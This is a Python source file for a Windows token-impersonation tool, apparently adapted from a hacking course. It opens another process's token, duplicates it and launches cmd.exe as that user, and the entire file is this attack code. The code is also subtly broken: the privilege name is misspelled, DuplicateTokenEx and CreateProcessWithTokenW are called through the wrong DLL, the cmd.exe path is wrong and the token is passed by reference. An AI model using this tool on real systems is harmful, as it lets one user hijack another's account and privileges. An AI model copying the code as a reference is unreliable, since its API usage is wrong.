"""
 Filename: impersonation_tool.py
 Description: Reads the process token running under another user, then spawns a
 new process running as that user but belonging to this process.

 Heavily modified from Brandon Dennis' "Hacking Windows API With Python" course
 on Udemy.
 Created by: Benjamin M. Singleton
 Created: 03-13-2020
"""

# Import the required module to handle Windows API Calls
import ctypes

# Import Python -> Windows Types from ctypes
from ctypes.wintypes import DWORD, LPVOID, BOOL, HANDLE, WORD, LPBYTE, LPSTR
import os

# Access Rights
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                    TOKEN_ASSIGN_PRIMARY |
                    TOKEN_DUPLICATE |
                    TOKEN_IMPERSONATION |
                    TOKEN_QUERY |
                    TOKEN_QUERY_SOURCE |
                    TOKEN_ADJUST_PRIVILEGES |
                    TOKEN_ADJUST_GROUPS |
                    TOKEN_ADJUST_DEFAULT |
                    TOKEN_ADJUST_SESSIONID)

# Privilege Enabled/Disabled Mask
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_DISABLED = 0x00000000


# Needed Structures for used API Calls
class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", DWORD),
        ("HighPart", DWORD),
    ]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", DWORD),
    ]


class PRIVILEGE_SET(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Control", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES),
    ]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES),
    ]


class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", DWORD),
        ("lpSecurityDescriptor", LPVOID),
        ("bInheritHandle", BOOL)
    ]


class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ('cb', DWORD),
        ('lpReserved', LPSTR),
        ('lpDesktop', LPSTR),
        ('lpTitle', LPSTR),
        ('dwX', DWORD),
        ('dwY', DWORD),
        ('dwXSize', DWORD),
        ('dwYSize', DWORD),
        ('dwXCountChars', DWORD),
        ('dwYCountChars', DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags', DWORD),
        (' wShowWindow', WORD),
        (' cbReserved2', WORD),
        ('lpReserved2', LPBYTE),
        ('hStdInput', HANDLE),
        ('hStdOutput', HANDLE),
        ('hStdError', HANDLE)
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD)
    ]


def find_window_a(lpWindowName, u_handle, k_handle):
    # Grab a Handle to the Process
    hWnd = u_handle.FindWindowA(None, lpWindowName)

    # Check to see if we have the Handle
    if hWnd == 0:
        print("[ERROR] Could Not Grab Handle! Error Code: {0}".format(k_handle.GetLastError()))
        exit(1)
    else:
        print("[INFO] Grabbed Handle...")
    return hWnd


def get_window_thread_process_id(hWnd, u_handle, k_handle):
    # Get the PID of the process at the handle
    lpdwProcessId = ctypes.c_ulong()

    # We use byref to pass a pointer to the value as needed by the API Call
    response = u_handle.GetWindowThreadProcessId(hWnd, ctypes.byref(lpdwProcessId))

    # Check to see if the call Completed
    if response == 0:
        print("[ERROR] Could Not Get PID from Handle! Error Code: {0}".format(k_handle.GetLastError()))
    else:
        print("[INFO] Found PID...")
    return lpdwProcessId


def open_process(lpdwProcessId, k_handle):
    # Opening the Process by PID with Specific Access
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProcessId = lpdwProcessId

    # Calling the Windows API Call to Open the Process
    hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)

    # Check to see if we have a valid Handle to the process
    if hProcess <= 0:
        print("[ERROR] Could Not Grab Privileged Handle! Error Code: {0}".format(k_handle.GetLastError()))
    else:
        print("[INFO] Privileged Handle Opened...")
    return hProcess


def open_process_token(hProcess, k_handle):
    # Open a Handle to the Process's Token Directly
    ProcessHandle = hProcess
    DesiredAccess = TOKEN_ALL_ACCESS
    TokenHandle = ctypes.c_void_p()

    # Issue the API Call
    response = k_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))

    # Handle an Error
    if response > 0:
        print("[INFO] Handle to Process Token Created! Token: {0}".format(TokenHandle))
    else:
        print("[ERROR] Could Not Grab Privileged Handle to Token! Error Code: {0}".format(k_handle.GetLastError()))
        exit(1)  # no point in going on
    return TokenHandle

# Check to see if we have the given privilege
# First use the LookupPrivilegeValue API Call to get the LUID based on the String Privilege name


def lookup_privilege_value(privilege_name, a_handle, k_handle):
    # Setup a PRIVILEGE_SET for the PrivilegeCheck Call to be used later - We need the LUID to be used
    # We will reference it later as well
    requiredPrivileges = PRIVILEGE_SET()
    requiredPrivileges.PrivilegeCount = 1  # We are only looking at 1 Privilege at a time here
    requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES()  # Setup a new LUID_AND_ATTRIBUTES
    requiredPrivileges.Privileges.Luid = LUID()  # Setup a New LUID inside of the LUID_AND_ATTRIBUTES structure

    # Params for Lookup API Call
    lpSystemName = None
    lpName = privilege_name

    # We now issue the Call to configure the LUID with the Systems Value of that Privilege
    response = a_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(requiredPrivileges.Privileges.Luid))

    # Handle an Error
    if response > 0:
        print("[INFO] Privilege Lookup Worked...")
    else:
        print("[ERROR] Privilege Lookup Failed! Error Code: {0}".format(k_handle.GetLastError()))
        raise Exception()

    # if the privilege doesn't exist on the machine the call will succeed but the
    # LUID will be all zeroes
    if requiredPrivileges.Privileges.Luid.HighPart == 0 and requiredPrivileges.Privileges.Luid.LowPart == 0:
        print('LookupPrivilegeValue() call succeeded, but privilege was not found.')
        raise Exception()

    return requiredPrivileges


def privilege_check(TokenHandle, requiredPrivileges, a_handle, k_handle):
    # Now that our LUID is setup and pointing to the correct Privilege we can check to see if its enabled
    pfResult = ctypes.c_long()

    response = a_handle.PrivilegeCheck(TokenHandle, ctypes.byref(requiredPrivileges), ctypes.byref(pfResult))

    # Handle an Error
    if response > 0:
        print("[INFO] PrivilegeCheck Worked...")
    else:
        print("[ERROR] PrivilegeCheck Failed! Error Code: {0}".format(k_handle.GetLastError()))

    # We can check pfResult to see if our Privilege is enabled or not
    if pfResult:
        print("[INFO] Privilege is Enabled...")
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_DISABLED  # Disable if its currently Enabled
    else:
        print("[INFO] Privilege is NOT Enabled...")
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED  # Enable if currently Disabled
    return requiredPrivileges


def adjust_token_privilege(requiredPrivileges, TokenHandle, a_handle, k_handle):
    # We will now attempt to modify the selected Privilege in the Token
    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()

    # Configure Token Privileges
    NewState.PrivilegeCount = 1
    # we can reuse this LUID because it's the same privilege on the same machine
    NewState.Privileges = requiredPrivileges.Privileges

    response = a_handle.AdjustTokenPrivileges(
        TokenHandle,
        DisableAllPrivileges,
        ctypes.byref(NewState),
        BufferLength,
        ctypes.byref(PreviousState),
        ctypes.byref(ReturnLength))

    # Handle an Error
    if response > 0:
        print("[INFO] AdjustTokenPrivileges Flipped Privilege...")
    else:
        print("[ERROR] AdjustTokenPrivileges Failed! Error Code: {0}".format(k_handle.GetLastError()))


def duplicate_token_ex(target_token_handle, k_handle):
    # now we duplicate the target process token
    hExistingToken = target_token_handle
    dwDesiredAccess = TOKEN_ALL_ACCESS
    lpTokenAttributes = SECURITY_ATTRIBUTES()
    ImpersonationLevel = 2  # see _SECURITY_IMPERSONATION_LEVEL documentation, 2 == SecurityImpersonation
    TokenType = 1  # 1 == TokenPrimary, meaning it can be used for CreateProcessAsUser and others
    phNewToken = ctypes.c_void_p()  # allocate a pointer for the new handle

    # set up the necessary Security Attributes
    lpTokenAttributes.bInheritHandle = False  # unnecessary here because it won't be spawning further processes
    lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()  # has to be right size for a pointer
    lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)  # set the right size of itself

    # Calls DuplicateTokenEx
    response = k_handle.DuplicateTokenEX(
        hExistingToken,
        dwDesiredAccess,
        ctypes.byref(lpTokenAttributes),
        ImpersonationLevel,
        TokenType,
        ctypes.byref(phNewToken)
    )

    if response > 0:
        print("[INFO] DuplicateTokenEX worked...")
    else:
        print("[ERROR] DuplicateTokenEX Failed! Error Code: {0}".format(k_handle.GetLastError()))

    return phNewToken


def create_process_with_token_w(hToken, k_handle):
    # hToken given
    dwLogonFlags = 0x00000001  # corresponds to LOGON_WITH_PROFILE, instead of using the network
    lpApplicationName = "C:\System32\cmd.exe"
    lpCommandLine = None  # not using any command-line arguments
    dwCreationFlags = 0x00000010  # CREATE_NEW_CONSOLE (i.e., spawn separate window)
    lpEnvironment = None  # use the impersonated user's environment instead
    lpCurrentDirectory = None  # use our current directory
    lpStartupInfo = STARTUPINFOA()  # see below for new window's attributes
    lpProcessInformation = PROCESS_INFORMATION()  # a pointer to store the new process info under

    # set the attributes for the new window
    lpStartupInfo.wShowWindow = 0x1  # 0x1 == show normal size, 0x3 == maximize
    lpStartupInfo.dwFlags = 0x1  # have to set this flag for the API to check the wShowWindow setting

    # CreateProcessWithTokenW
    response = k_handle.CreateProcessWithTokenW(
        ctypes.byref(hToken),
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        ctypes.byref(lpStartupInfo),
        ctypes.byref(lpProcessInformation)
    )

    if response > 0:
        print("[INFO] CreateProcessWithTokenW worked...")
    else:
        print("[ERROR] CreateProcessWithTokenW Failed! Error Code: {0}".format(k_handle.GetLastError()))

    return lpProcessInformation


def my_get_proces_token(lpWindowName, k_handle, u_handle):
    hWnd = find_window_a(lpWindowName, u_handle, k_handle)
    lpdwProcessId = get_window_thread_process_id(hWnd, u_handle, k_handle)
    hProcess = open_process(lpdwProcessId, k_handle)
    TokenHandle = open_process_token(hProcess, k_handle)
    return TokenHandle


def my_get_proces_token_by_id(lpdwProcessId, k_handle):
    hProcess = open_process(lpdwProcessId, k_handle)
    TokenHandle = open_process_token(hProcess, k_handle)
    return TokenHandle


def toggle_privilege(privilege_name, TokenHandle, a_handle, k_handle):
    requiredPrivileges = lookup_privilege_value(privilege_name, a_handle, k_handle)
    requiredPrivileges = privilege_check(TokenHandle, requiredPrivileges, a_handle, k_handle)
    adjust_token_privilege(requiredPrivileges, TokenHandle, a_handle, k_handle)


def main():
    """
    What we're doing is getting the process token of the target process and our
    own process token. We are going to enable SEDebugPrivilege in our token and
    then use DuplicateTokenEX on the target process. Lastly we use
    CreateProcessWithTokenW with that duplicate token to create a new process
    running as the other user.
    :return:
    """
    # grab a handle to kernel32.dll & USer32.dll & Advapi32.dll
    k_handle = ctypes.WinDLL("Kernel32.dll")
    u_handle = ctypes.WinDLL("User32.dll")
    a_handle = ctypes.WinDLL("Advapi32.dll")

    # get the target process token using the window title
    lpWindowName = ctypes.c_char_p(input("Enter Window Name To Hook Into: ").encode('utf-8'))
    target_token_handle = my_get_proces_token(lpWindowName, k_handle, u_handle)

    # need to enable SEDebugPrivilege in our process so we can launch an
    # impersonated process
    my_process_id = os.getpid()
    my_token_handle = my_get_proces_token_by_id(my_process_id, k_handle)
    toggle_privilege('SEDebugPrivlege', my_token_handle, a_handle, k_handle)

    hToken = duplicate_token_ex(target_token_handle, k_handle)

    new_process = create_process_with_token_w(hToken, k_handle)

    print('New process ID: {0}'.format(new_process.dwProcessId))


if __name__ == '__main__':
    main()
